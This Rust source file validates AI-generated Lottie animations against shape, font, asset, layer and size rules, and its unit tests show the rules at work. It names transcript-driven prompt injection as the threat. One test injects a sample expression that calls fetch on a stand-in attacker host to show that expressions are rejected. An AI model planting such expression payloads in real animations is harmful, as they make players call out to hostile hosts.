//! Validation of Claude-generated Lottie. Generated Lottie is untrusted input.
//!
//! A transcript is text the creator did not fully control (it is whatever was
//! said on camera), and it goes into the prompt. A hostile phrase could steer
//! the model, so the output is checked before it is saved or rendered:
//!
//! - shape: a Lottie root with the project's `w`, `h`, `fr`, and `op` equal to
//!   the segment length;
//! - no expressions: in Lottie, a string-valued `x` on a property is
//!   JavaScript the player would evaluate;
//! - no image or audio assets, no external fonts, only the layer types we
//!   render (precomp, solid, null, shape, text);
//! - only bundled fonts;
//! - one marker per word ID, which is how we detect drift after edits;
//! - size, depth and layer-count limits, so a reply cannot exhaust the renderer.

use std::collections::HashSet;

use serde_json::Value;

pub const FONT_FAMILY: &str = "Hanken Grotesk";
pub const FONT_NAMES: &[&str] = &["HankenGrotesk-Regular", "HankenGrotesk-Medium", "HankenGrotesk-Bold"];
pub const MAX_BYTES: usize = 1_500_000;
pub const MAX_LAYERS: usize = 400;
pub const MAX_DEPTH: usize = 48;
pub const MAX_NODES: usize = 250_000;
const ALLOWED_LAYER_TYPES: &[i64] = &[0, 1, 3, 4, 5];
const MAX_ERRORS: usize = 12;

pub struct Expected<'a> {
    pub width: u32,
    pub height: u32,
    pub fps: f64,
    pub frames: u64,
    pub word_ids: &'a [String],
}

#[derive(Default)]
struct Walk {
    nodes: usize,
    errors: Vec<String>,
}

impl Walk {
    fn err(&mut self, e: String) {
        if self.errors.len() < MAX_ERRORS && !self.errors.contains(&e) {
            self.errors.push(e);
        }
    }

    fn visit(&mut self, v: &Value, path: &str, depth: usize) {
        self.nodes += 1;
        if self.nodes > MAX_NODES {
            if self.nodes == MAX_NODES + 1 {
                self.err(format!("Animation is too complex (more than {MAX_NODES} values)."));
            }
            return;
        }
        if depth > MAX_DEPTH {
            self.err(format!("Animation is nested too deeply at {path}."));
            return;
        }
        match v {
            Value::Object(map) => {
                for (k, child) in map {
                    if k == "x" && child.is_string() {
                        self.err(format!("Expressions are not allowed (found an \"x\" expression at {path})."));
                        continue;
                    }
                    self.visit(child, &format!("{path}.{k}"), depth + 1);
                }
            }
            Value::Array(items) => {
                for (i, child) in items.iter().enumerate() {
                    self.visit(child, &format!("{path}[{i}]"), depth + 1);
                }
            }
            _ => {}
        }
    }
}

fn num(v: &Value, key: &str) -> Option<f64> {
    v.get(key).and_then(Value::as_f64)
}

fn check_layers(layers: &[Value], where_: &str, fonts: &HashSet<String>, count: &mut usize, w: &mut Walk) {
    for (i, layer) in layers.iter().enumerate() {
        *count += 1;
        let ty = layer.get("ty").and_then(Value::as_i64);
        match ty {
            Some(t) if ALLOWED_LAYER_TYPES.contains(&t) => {}
            Some(2) => w.err(format!("Image layers are not allowed ({where_}[{i}]).")),
            Some(6) => w.err(format!("Audio layers are not allowed ({where_}[{i}]).")),
            Some(t) => w.err(format!("Layer type {t} is not supported ({where_}[{i}]). Use precomp, solid, null, shape or text layers.")),
            None => w.err(format!("Layer {where_}[{i}] has no \"ty\".")),
        }
        if ty == Some(5) {
            let docs = layer.pointer("/t/d/k").and_then(Value::as_array);
            match docs {
                None => w.err(format!("Text layer {where_}[{i}] has no text document at t.d.k.")),
                Some(docs) => {
                    for d in docs {
                        let f = d.pointer("/s/f").and_then(Value::as_str).unwrap_or("");
                        if !fonts.contains(f) {
                            w.err(format!(
                                "Text layer {where_}[{i}] uses font {f:?}, which is not in fonts.list. Use one of {}.",
                                FONT_NAMES.join(", ")
                            ));
                        }
                    }
                }
            }
        }
    }
}

/// Returns every problem found; an empty list means the animation is usable.
pub fn validate(v: &Value, exp: &Expected) -> Vec<String> {
    let mut w = Walk::default();
    let Some(root) = v.as_object() else {
        return vec!["The animation must be a JSON object.".into()];
    };
    if let Ok(s) = serde_json::to_vec(v) {
        if s.len() > MAX_BYTES {
            w.err(format!("Animation is {} KB; the limit is {} KB.", s.len() / 1024, MAX_BYTES / 1024));
        }
    }

    if num(v, "w") != Some(exp.width as f64) || num(v, "h") != Some(exp.height as f64) {
        w.err(format!("\"w\" and \"h\" must be {} and {}.", exp.width, exp.height));
    }
    match num(v, "fr") {
        Some(fr) if (fr - exp.fps).abs() < 0.01 => {}
        _ => w.err(format!("\"fr\" must be {}.", round3(exp.fps))),
    }
    let ip = num(v, "ip").unwrap_or(-1.0);
    let op = num(v, "op").unwrap_or(-1.0);
    if ip != 0.0 {
        w.err("\"ip\" must be 0.".into());
    }
    if (op - exp.frames as f64).abs() > 1.0 {
        w.err(format!("\"op\" must be {} (the segment length in frames).", exp.frames));
    }

    // Fonts: bundled family only, never loaded from a URL or a font service.
    let mut fonts = HashSet::new();
    if let Some(list) = v.pointer("/fonts/list").and_then(Value::as_array) {
        for f in list {
            let name = f.get("fName").and_then(Value::as_str).unwrap_or("");
            let family = f.get("fFamily").and_then(Value::as_str).unwrap_or("");
            if family != FONT_FAMILY || !FONT_NAMES.contains(&name) {
                w.err(format!("Font {name:?} ({family:?}) is not available. Use {FONT_FAMILY}: {}.", FONT_NAMES.join(", ")));
            }
            let path = f.get("fPath").and_then(Value::as_str).unwrap_or("");
            let origin = f.get("fOrigin").and_then(Value::as_str).unwrap_or("");
            if !path.is_empty() || matches!(origin, "g" | "p" | "t") {
                w.err("Fonts must not be loaded from a path or URL (remove fPath and fOrigin).".into());
            }
            fonts.insert(name.to_string());
        }
    }

    // Assets: precomps only.
    let mut layer_count = 0;
    if let Some(assets) = root.get("assets").and_then(Value::as_array) {
        for (i, a) in assets.iter().enumerate() {
            if a.get("p").is_some() || a.get("u").is_some() {
                w.err(format!("Image and file assets are not allowed (assets[{i}])."));
            }
            match a.get("layers").and_then(Value::as_array) {
                Some(layers) => check_layers(layers, &format!("assets[{i}].layers"), &fonts, &mut layer_count, &mut w),
                None => w.err(format!("Asset {i} must be a precomp with \"layers\".")),
            }
        }
    }
    match root.get("layers").and_then(Value::as_array) {
        Some(layers) if !layers.is_empty() => check_layers(layers, "layers", &fonts, &mut layer_count, &mut w),
        _ => w.err("\"layers\" must be a non-empty array.".into()),
    }
    if layer_count > MAX_LAYERS {
        w.err(format!("Animation has {layer_count} layers; the limit is {MAX_LAYERS}."));
    }

    // Word markers.
    let marked: HashSet<&str> = root
        .get("markers")
        .and_then(Value::as_array)
        .map(|m| m.iter().filter_map(|m| m.get("cm").and_then(Value::as_str)).collect())
        .unwrap_or_default();
    let missing: Vec<&str> = exp.word_ids.iter().map(String::as_str).filter(|id| !marked.contains(id)).collect();
    if !missing.is_empty() {
        let shown: Vec<&str> = missing.iter().take(5).copied().collect();
        w.err(format!(
            "Every word needs a marker whose \"cm\" is its word ID. Missing {} (for example {}).",
            missing.len(),
            shown.join(", ")
        ));
    }

    w.visit(v, "$", 0);
    w.errors
}

/// After validation passes: pin the timing fields to exact values.
pub fn normalize(v: &mut Value, exp: &Expected) {
    if let Some(o) = v.as_object_mut() {
        o.insert("ip".into(), 0.into());
        o.insert("op".into(), exp.frames.into());
        o.insert("fr".into(), serde_json::json!(round3(exp.fps)));
        o.entry("ddd").or_insert(0.into());
        o.entry("assets").or_insert(serde_json::json!([]));
    }
}

pub fn round3(x: f64) -> f64 {
    (x * 1000.0).round() / 1000.0
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ids() -> Vec<String> {
        vec!["w_00001".into(), "w_00002".into()]
    }

    fn good() -> Value {
        json!({
            "v": "5.7.4", "fr": 30, "ip": 0, "op": 45, "w": 1080, "h": 1920, "ddd": 0, "assets": [],
            "fonts": {"list": [{"fName": "HankenGrotesk-Bold", "fFamily": "Hanken Grotesk", "fStyle": "Bold", "ascent": 72}]},
            "markers": [{"cm": "w_00001", "tm": 0, "dr": 10}, {"cm": "w_00002", "tm": 12, "dr": 10}],
            "layers": [{
                "ddd": 0, "ind": 1, "ty": 5, "nm": "Hello", "sr": 1, "ip": 0, "op": 45, "st": 0, "bm": 0, "ao": 0,
                "ks": {"o": {"a": 0, "k": 100}, "r": {"a": 0, "k": 0}, "p": {"a": 0, "k": [540, 1400, 0]},
                       "a": {"a": 0, "k": [0, 0, 0]}, "s": {"a": 0, "k": [100, 100, 100]}},
                "t": {"d": {"k": [{"s": {"s": 96, "f": "HankenGrotesk-Bold", "t": "Hello", "j": 2, "tr": 0, "lh": 115, "ls": 0, "fc": [1, 1, 1]}, "t": 0}]},
                      "p": {}, "m": {"g": 1, "a": {"a": 0, "k": [0, 0]}}, "a": []}
            }]
        })
    }

    fn exp(ids: &[String]) -> Expected<'_> {
        Expected { width: 1080, height: 1920, fps: 30.0, frames: 45, word_ids: ids }
    }

    #[test]
    fn accepts_a_valid_animation() {
        let ids = ids();
        assert_eq!(validate(&good(), &exp(&ids)), Vec::<String>::new());
    }

    #[test]
    fn rejects_expressions_anywhere() {
        let ids = ids();
        let mut v = good();
        v["layers"][0]["ks"]["o"]["x"] = json!("var $bm_rt = fetch('https://evil.example');");
        let errs = validate(&v, &exp(&ids));
        assert!(errs.iter().any(|e| e.contains("Expressions")), "{errs:?}");
    }

    #[test]
    fn allows_numeric_x_such_as_mask_expansion() {
        let ids = ids();
        let mut v = good();
        v["layers"][0]["masksProperties"] = json!([{"x": {"a": 0, "k": 0}, "mode": "a"}]);
        assert!(validate(&v, &exp(&ids)).is_empty());
    }

    #[test]
    fn rejects_images_external_fonts_and_unknown_layers() {
        let ids = ids();
        let mut v = good();
        v["assets"] = json!([{"id": "img", "w": 10, "h": 10, "u": "https://x/", "p": "a.png"}]);
        v["fonts"]["list"][0]["fPath"] = json!("https://fonts.example/f.css");
        v["layers"].as_array_mut().unwrap().push(json!({"ty": 2, "refId": "img"}));
        v["layers"].as_array_mut().unwrap().push(json!({"ty": 13}));
        let errs = validate(&v, &exp(&ids));
        assert!(errs.iter().any(|e| e.contains("file assets")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("path or URL")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("Image layers")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("type 13")), "{errs:?}");
    }

    #[test]
    fn checks_canvas_timing_fonts_and_markers() {
        let ids = vec!["w_00001".to_string(), "w_00002".into(), "w_00003".into()];
        let mut v = good();
        v["w"] = json!(1920);
        v["op"] = json!(90);
        v["fr"] = json!(25);
        v["layers"][0]["t"]["d"]["k"][0]["s"]["f"] = json!("Comic Sans");
        let errs = validate(&v, &exp(&ids));
        let all = errs.join("\n");
        assert!(all.contains("\"w\" and \"h\""));
        assert!(all.contains("\"op\" must be 45"));
        assert!(all.contains("\"fr\" must be 30"));
        assert!(all.contains("Comic Sans"));
        assert!(all.contains("Missing 1"));
    }

    #[test]
    fn normalize_pins_timing() {
        let ids = ids();
        let mut v = good();
        v["op"] = json!(46);
        normalize(&mut v, &exp(&ids));
        assert_eq!(v["op"], 45);
        assert_eq!(v["ip"], 0);
    }
}
